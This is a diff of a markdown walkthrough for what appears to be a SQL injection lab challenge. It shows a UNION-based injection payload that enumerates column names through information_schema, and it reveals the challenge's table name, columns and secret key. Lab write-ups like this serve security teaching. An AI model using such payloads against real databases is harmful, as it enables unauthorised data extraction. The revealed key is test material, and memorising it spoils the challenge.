@@ -1,8 +1,8 @@
-## Challenge - 3
+# Challenge - 3
 
 This challenge is similar to the previous two challenges and we have 14 tries to dump the secret key
 
-### Initial Analysis
+## Initial Analysis
 
 Here also we have to find  how the developer has given the query so we try giving id the values
 
@@ -35,17 +35,15 @@ Now we can find table name like in the previous problem using
 ```
 
 which gives us the table name :
-
 **g3xh31tkpv**
 
-Now we can find the columns in the table using 
+Now we can find the columns in the table using
 
 ```sql
 0') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='g3xh31tkpv' and table_schema='CHALLENGES'; --+
 ```
 
 we get 4 column names:
-
 **id,sessid,secret_WP9T,tryy**
 
 The secret key can be in any of these columns but we can always go for the most suspicious one and print the secret key using:
@@ -55,6 +53,4 @@ The secret key can be in any of these columns but we can always go for the most 
 ```
 
 We get the secret key:
-
 **fC3cDPza7ljnkhuhIHAlDw6o**
-
